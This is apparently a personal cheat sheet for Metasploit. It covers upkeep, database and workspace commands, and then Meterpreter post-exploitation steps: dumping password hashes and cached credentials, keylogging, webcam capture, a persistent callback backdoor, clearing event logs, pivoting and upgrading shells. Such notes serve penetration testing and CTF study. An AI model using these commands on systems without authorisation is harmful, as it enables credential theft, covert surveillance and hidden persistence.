# Metasploit maintenance etc.

Note: *Here are some essential tips and commands for maintaining Metasploit, along with various handy tools to enhance my hacking workflow and improve overall efficiency.*

To keep Metasploit up-to-date on a system using apt-get, follow these steps:

- Update the package lists:

```
sudo apt-get update
```

- Upgrade Metasploit:

```
sudo apt-get install metasploit-framework
```

Usually, updating Metasploit with apt-get shouldn’t leave behind any unwanted leftovers. However, if you want to clean up residual packages or old dependencies that might be taking up space, use these commands:

- Remove unnecessary packages:

```
sudo apt-get autoremove
```

- Clean up downloaded package files:

```
sudo apt-get clean
```

Metasploit relies heavily on its database for storing collected data during penetration testing. Here’s how to manage it:

- Check the database connection status:

```
db_status
```

Expected output:

```
msf > db_status
[*] postgresql connected to msf
msf >
```

- If it’s not connected, restart the PostgreSQL service:

```
service postgresql restart
```

- After restarting, relaunch Metasploit:

```
msfconsole
```

- To start the database on boot:

```
service postgresql start
```

Metasploit uses workspaces to organize your data. Here’s how to manage them:

- List all workspaces:

```
workspace
```

- Delete a workspace:

```
workspace -d <workspace_name>
```

If you delete the only workspace, a new default workspace will be created automatically.

- To create a new workspace:

```
workspace -a <workspace_name>
```

- Switch between workspaces:

```
workspace <workspace_name>
```

- Clear the database (if starting fresh is needed):

```
workspace -d <workspace_name>
```

Metasploit allows you to perform Nmap scans directly from the Metasploit console, and the results are automatically stored in the database:

- Perform an Nmap scan (example):

```
db_nmap -v -T4 -PA -sV --version-all --osscan-guess -A -sS -p 1-65535 <ip_address>
```

- View gathered information:

```
services
```

You can search for exploits directly within Metasploit:

- Search for exploits:

```
searchsploit <search_term>
```

Managing active sessions is a crucial part of using Metasploit:

- List all active sessions:

```
sessions -l
```

- Interact with a session:

```
sessions -i <session_number>
```

- Kill a session:

```
sessions -k <session_number>
```

- Kill all sessions:

```
sessions -K
```

Always exit Metasploit gracefully to ensure all services and sessions are properly terminated:

```
exit
```

**Post-Exploitation Techniques:**

Once you've successfully gained access to a target system, these commands will help you gather further information, escalate privileges, and maintain control.

- Get system information (displays basic information about the target system, such as OS, architecture, and hostname):

```
sysinfo
```

- Get user ID (shows the username under which the Meterpreter session is running):

```
getuid
```

- Get privileges (lists all privileges assigned to the current user account):

```
getprivs
```

- Attempt privilege escalation (attempts to escalate privileges to SYSTEM on Windows systems using a variety of techniques):

```
getsystem
```

- Check if running as SYSTEM:

```
getuid
```

- Dump password hashes (dumps the password hashes from the target system's SAM database (Windows)):

```
hashdump
```

- Retrieve cached domain credentials (Windows):

```
run post/windows/gather/credentials/lsa_cache
```

- Start keystroke logger:

```
keyscan_start
```

- Dump keystroke logs:

```
keyscan_dump
```

- Stop keystroke logging:

```
keyscan_stop
```

- Capture a screenshot:

```
screenshot
```

- Capture from webcam:

```
webcam_snap
```

- Stream from webcam:

```
webcam_stream
```

- List directory contents:

```
ls
```

- Download a file:

```
download <file_path>
```

- Upload a file:

```
upload <local_file> <target_directory>
```

- List running processes:

```
ps
```

- Migrate to another process (moves the Meterpreter session to another process, often used to maintain access if the original process is at risk of termination):

```
migrate <process_id>
```

- Kill a process:

```
kill <process_id>
```

- Create a persistent backdoor (sets up a persistent Meterpreter backdoor that attempts to reconnect every 5 seconds. The ```<port>``` and ```<IP_address>``` refer to the attacker's machine):

```
run persistence -U -i 5 -p <port> -r <IP_address>
```

- Clear the Windows Event Logs:

```
run post/windows/manage/clear_eventlog
```

**Pivoting in Metasploit:**

Pivoting is a crucial technique in penetration testing, allowing an attacker to access and compromise systems within a network that are otherwise inaccessible. This is particularly useful when dealing with segmented networks, where different subnets are isolated from one another.

In a real-world penetration test, you often encounter environments with multiple networks, separated by firewalls or switches. Pivoting leverages a compromised host that has access to multiple networks (via physical or virtual network adapters) to route traffic through it to other, less accessible targets.

You can manually set up a pivot in Metasploit by adding routes through the compromised host:

```
route add <subnet> <netmask> <session_id>
```

Example:

```
route add 192.168.1.0 255.255.255.0 1
```

Here, 192.168.1.0 is the target network, 255.255.255.0 is the subnet mask, and 1 is the session ID of the compromised host. This command configures Metasploit to route traffic through this session to reach the specified subnet. So, when you use the route add command, you’re telling Metasploit to route traffic destined for a certain subnet (which could be in a different network) through the compromised host. This allows you to target machines in that other network from your attacking machine, even though they aren't directly reachable by it.

To see all active routes:

```
route
```

Example output:

```
msf > route
IPv4 Active Routing Table
=========================
Subnet        Netmask        Session ID
192.168.1.0   255.255.255.0  1
```

If a route is no longer needed, remove it with:

```
route delete <subnet>
```

Also, Metasploit provides a module called autoroute to simplify the pivoting process by automatically adding routes for you. If you have a Meterpreter session on a compromised host, you can use the autoroute module to set up routes automatically.

Example:

```
meterpreter > background
msf6 exploit(multi/handler) > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 169.254.0.0
msf6 post(multi/manage/autoroute) > set NETMASK /16
msf6 post(multi/manage/autoroute) > run
```

This command sequence sets up routes to the specified subnet (in this case, 169.254.0.0/16) through the compromised session.

After running autoroute, you can view the active routes just like with manual routes (with the ```route``` command).

To clear all routes:

```
route flush
```

Then, verify with the ```route``` command again.

**Other tidbits and tricks:**

- Search for a Specific File:

```
search -f flag2.txt
```

This command searches for a file named flag2.txt on the target system. If the file exists, the command will display the path to it. Wildcards are also possible:

```
search -f *.log
```

- Search for Multiple Files:

```
search -f "*.txt"
```

This will search for all text files (.txt) on the target system.

Note: *The ```search -f``` command is part of Meterpreter’s suite of file system utilities, which includes commands for listing directories, downloading, uploading, and manipulating files, providing a comprehensive set of tools for post-exploitation tasks.*

*Upgrading to Meterpreter during a session can significantly enhance your control over the target system by providing a more feature-rich environment compared to a basic shell. If you have a basic shell session on the target system, you can use Metasploit's built-in upgrade command to switch to Meterpreter.*

- First, establish a basic shell session on the target system. This could be through an initial exploit or payload. In Metasploit, list your active sessions and interact with the basic shell session:

```
sessions
sessions -i <session_id>
```

- Use the upgrade command to switch to a Meterpreter session:

```
upgrade
```

Alternatively, the ```post/multi/manage/shell_to_meterpreter``` module in Metasploit is designed to upgrade a standard shell session to a Meterpreter session. This module is used to convert a basic command shell (like a standard shell session obtained through exploitation) into a Meterpreter session, which provides more advanced functionality and control.

After gaining a shell session, you can use this module to upgrade it. Run the following commands:

```
use post/multi/manage/shell_to_meterpreter
```

You need to specify the session ID of the shell session you want to upgrade (optionally, you can configure additional settings if required by the module):

```
set SESSION <session_id>
```

Execute the module to perform the upgrade:

```
run
```

Note: *This module relies on the compatibility of the shell you’re upgrading. Some shells might not support the upgrade process due to their nature or the limitations of the environment. Also, ensure that network configurations or firewall rules do not interfere with the Meterpreter payload's ability to establish a connection. If the target network is segmented (e.g., through VLANs or subnetting), ensure that the Meterpreter payload can communicate with the attacker's machine. Network segmentation might isolate parts of the network, potentially blocking the connection. Furthermore, ensure that the ports used by the Meterpreter payload (usually set by the payload configuration) are open and not blocked by any firewall rules on the target or between the target and the attacker. If the target machine is behind NAT, the NAT configuration must allow for the necessary port forwarding or address translation to enable communication between the target and the attacker’s machine.*
